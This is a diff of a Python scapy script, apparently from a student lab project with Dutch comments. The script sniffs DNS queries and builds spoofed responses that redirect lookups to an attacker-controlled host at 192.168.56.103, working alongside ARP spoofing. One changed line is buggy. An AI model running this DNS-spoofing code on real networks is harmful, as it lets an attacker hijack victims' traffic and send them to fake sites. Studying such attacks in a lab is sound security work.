@@ -4,8 +4,8 @@ from sys import argv
 import socket
 
 # DNS spoofing will make use of ARP spoofing
-from scapy.layers.dns import DNSQR, UDP, DNS, DNSRR
-from scapy.layers.inet import IP, TCP
+#from scapy.layers.dns import DNSQR, UDP, DNS, DNSRR
+#from scapy.layers.inet import IP, TCP
 
 """ kan in een losse functie gezet worden, maar eerst kijken of het zo werkt
 def alter_packet(d_pkt):
@@ -26,24 +26,24 @@ def dns_spoof():
         DNSpkt = sniff(count=1, filter="dst port 53")
 
         # if it is a DNS request, start with creating response
-        if DNSpkt[0].haslayer(DNSQR):
+        if DNSpkt[0].haslayer(scapy.all.DNSQR):
             # ignore this: alter_packet(DNSpkt)
-            dstIP = DNSpkt.getlayer(IP).dst
-            srcIP = DNSpkt.getlayer(IP).src
+            dstIP = DNSpkt[0].getlayer(scapy.all.IP).dst
+            srcIP = DNSpkt[0].getlayer(scapy.all.IP).src
 
             # check if it is UDP or TCP traffic
-            if DNSpkt[0].haslayer(UDP):
-                dstPort = DNSpkt.getlayer(UDP).dport
-                srcPort = DNSpkt.getlayer(UDP).sport
-            elif DNSpkt[0].haslayer(TCP):
-                dstPort = DNSpkt.getlayer(TCP).dport
-                srcPort = DNSpkt.getlayer(TCP).sport
+            if DNSpkt[0].haslayer(scapy.all.UDP):
+                dstPort = DNSpkt[0].getlayer(scapy.all.UDP).dport
+                srcPort = DNSpkt[0].getlayer(scapy.all.UDP).sport
+            elif DNSpkt[0].haslayer(scapy.all.TCP):
+                dstPort = DNSpkt.getlayer[0](scapy.all.TCP).dport
+                srcPort = DNSpkt.getlayer[0](scapy.all.TCP).sport
 
-            dnsId = DNSpkt.getlayer(DNS).id
-            dnsQd = DNSpkt.getlayer(DNS).qd
+            dnsId = DNSpkt[0].getlayer(scapy.all.DNS).id
+            dnsQd = DNSpkt[0].getlayer(scapy.all.DNS).qd
 
             # retrieve the name of the website that is searched for
-            queryName = DNSpkt.getlayer(DNS).qd.qname
+            queryName = DNSpkt[0].getlayer(scapy.all.DNS).qd.qname
 
             # TODO: create website and fill IP address in below
             my_site = '192.168.56.103'
